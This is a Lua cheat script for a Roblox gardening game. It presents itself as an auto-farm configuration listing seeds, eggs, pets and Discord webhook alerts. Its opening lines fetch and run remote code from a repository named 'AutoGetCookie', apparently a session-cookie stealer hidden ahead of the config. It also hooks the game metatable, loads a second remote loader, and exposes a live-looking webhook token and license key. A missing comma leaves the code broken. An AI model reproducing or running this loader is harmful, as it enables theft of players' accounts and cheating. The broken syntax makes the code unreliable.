spawn(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ThanhTuoi852123/AutoGetCookie/refs/heads/main/asd33.lua"))()
end)
wait(5)
local Players = game:GetService("Players")

-- Lấy metatable của Player instance
local mt = getrawmetatable(game:GetService("Players"):GetPlayers()[1] or Players.LocalPlayer)
local oldNamecall = mt.__namecall

setreadonly(mt, false)
mt.__namecall = function(self, ...)
    if getnamecallmethod() == "Destroy" and self.Parent == Players then
        print(123)
		return -- chặn xoá player trong game.Players
    end
    return oldNamecall(self, ...)
end
setreadonly(mt, true)
-- Update config : 10/08/2025

getgenv().ConfigsKaitun = {
	Beta_Fix_Data_Sync = false,

	NoDeletePlayer = false,

	Collect_Cooldown = 120, -- cooldown to collect fruit
 
	["Low Cpu"] = true,
	["Auto Rejoin"] = true,

	["Rejoin When Update"] = true,
	["Limit Tree"] = {
		["Limit"] = 200,
		["Destroy Untill"] = 180,

		["Safe Tree"] = {
			"Moon Blossom",
		}
	},

	Seed = {
		Buy = {
			Mode = "Custom", -- Custom , Auto
			Custom = {
				"Carrot",
			}
		},
		Place = {
			Mode = "Select", -- Select , Lock
			Select = {
				"Carrot",
			},
			Lock = {
				"Sunflower",
			}
		}
	},

	["Seed Pack"] = {
		Locked = {

		}
	},


	Events = {
		["Cook Event"] = {
			Minimum_Money = 10_000_000, -- minimum money to start play this event
			Rewards_Item = { -- The top is the most top mean prefered.
				"Gorilla Chef",
				"Culinarian Chest",
				"Gourmet Egg",
                                "Cooking Cauldron",
				"Sunny-Side Chicken",
				"Gourmet Seed Pack",
                                "Pet Shard Aromatic",
			}
		},
		["Traveling Shop"] = {
			"Bee Egg",
		},
		Craft = {
			"Primal Egg",
			"Ancient Seed Pack",
			"Bee Egg",
			"Anti Bee Egg",
		},
		Shop = {
			"Zen Egg",
                        "Zen Seed Pack",
		},
		Start_Do_Honey = 2_000_000 -- start trade fruit for honey at money
	},

	Gear = {
		Buy = { 
			"Master Sprinkler",
			"Trading Ticket"
			"Basic Sprinkler",
			"Godly Sprinkler",
			"Advanced Sprinkler",
			"Grandmaster Sprinkler",
			"Medium Treat",
			"Medium Toy",
		},
		Lock = {

		},
	},

	Eggs = {
		Place = {
                        "Gourmet Egg",
			"Zen Egg",
			"Primal Egg",
			"Dinosaur Egg",
			"Oasis Egg",
			"Anti Bee Egg",
			"Paradise Egg",
			"Night Egg",
			"Bug Egg",
			"Mythical Egg",
			"Common Summer Egg",
		},
		Buy = {
			"Anti Bee Egg",
			"Paradise Egg",
			"Bee Egg",
			"Night Egg",
			"Bug Egg",
			"Mythical Egg",
			"Common Summer Egg",
                        "Common Egg",
		}
	},

	Pets = {
		["Start Delete Pet At"] = 40,
		["Upgrade Slot"] = {
			["Pet"] = {
				["Starfish"] = { 5, 100, 1 },
                                ["Capybara"] = { 3, 100, 2 }, 
			},
			["Limit Upgrade"] = 5,
			["Equip When Done"] = {
                                ["Gorilla Chef"] = { 5, 100, 1 },
				["Sushi Bear"] = { 3, 100, 2 },
			},
		},
		Locked_Pet_Age = 60, -- pet that age > 60 will lock
		Locked = {
			"Cooked Owl",
			"Raiju",
                        "Gorilla Chef",
                        "Lobster Thermidor",
                        "French Fry Ferret",
			"Corrupted Kitsune",
                        "Kitsune",
			"Spinosaurus",
			"T-Rex",
			"Dragonfly",
			"Night Owl",
			"Queen Bee",
			"Raccoon",
			"Disco Bee",
			"Fennec Fox",
			"Disco Bee",
			"Butterfly",
			"Mimic Octopus",
			"Queen Bee",
			"Red Fox",
                        ["Sunny-Side Chicken"] = 8,
                        ["Ostrich"] = 8,
			["Capybara"] = 5,
			["Rooster"] = 6,
			["Blood Kiwi"] = 6,
			["Seal"] = 8,
		},
		LockPet_Weight = 6, -- if Weight >= 10 they will locked,
		Instant_Sell = {
			"Shiba Inu",
			"Dog",
                        "Seagull",
                        "Crab",
		}
	},

	Webhook = {
		UrlPet = "https://discord.com/api/webhooks/1389893507812036648/BGNvOWsSuUxM6AyKEEo8H_JDZ7CPrbio8DJ9rxHyEdHZ06bLc9b5088XXXu6k02jBIFB",
		UrlSeed = "Url Here",
		PcName = "tt",

		Noti = {
			Seeds = {
				"Sunflower",
				"Dragon Pepper",
				"Elephant Ears",
			},
			SeedPack = {
				"Idk"
			},
			Pets = {
                                "Lobster Thermidor",
                                "French Fry Ferret",
			        "Corrupted Kitsune",
                                "Kitsune",
                                "Spinosaurus",
			        "T-Rex",
				"Disco Bee",
				"Butterfly",
				"Mimic Octopus",
				"Queen Bee",
				"Fennec Fox",
				"Dragonfly",
				"Raccoon",
				"Red Fox",
			},
			Pet_Weight_Noti = true,
		}
	},
}
License = "zkY0Ng6LS0OLsczNpR0E6GcBVa8oPTNg"

loadstring(game:HttpGet('https://raw.githubusercontent.com/Real-Aya/Loader/main/Init.lua'))()
